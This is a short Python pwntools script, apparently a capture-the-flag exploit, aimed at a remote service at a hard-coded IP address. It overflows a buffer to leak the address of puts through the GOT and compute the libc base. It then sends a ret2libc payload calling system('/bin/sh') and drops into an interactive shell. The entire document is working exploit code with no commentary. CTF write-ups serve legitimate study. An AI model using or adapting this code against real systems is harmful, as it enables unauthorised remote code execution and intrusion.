from pwn import *
context.log_level = 'debug'
p = remote("157.230.33.195", 1111)
elf = ELF("./vuln")
pr = 0x0804901e
libc = ELF("./libc.so.6")
if __name__ == "__main__":
	p.sendline("1")
	payload = "b" * 12
	payload += p32(elf.plt['puts']) + p32(0x080492c9) + p32(elf.got['puts'])
	sleep(0.1)
	p.send(payload)
	sleep(0.1)
	p.sendline("2")
	sleep(0.1)
	p.sendline("a" * 0x20)
	sleep(0.1)
	p.recvuntil(payload)
	sleep(0.1)
	p.recvuntil("\x0a")
	sleep(0.1)
	libc_base = ((u32(p.recv(4)))) - libc.symbols['puts']
	system = libc_base + libc.symbols['system']
	binsh = libc_base + list(libc.search("/bin/sh"))[0]

	payload = "b" * 12 + p32(system) + "aaaa" + p32(binsh)

	p.sendline("1")
	sleep(0.1)
	p.send(payload)
	sleep(0.1)
	p.sendline("2")
	sleep(0.1)
	p.sendline("a" *0x20)
	sleep(0.1)
	p.interactive()
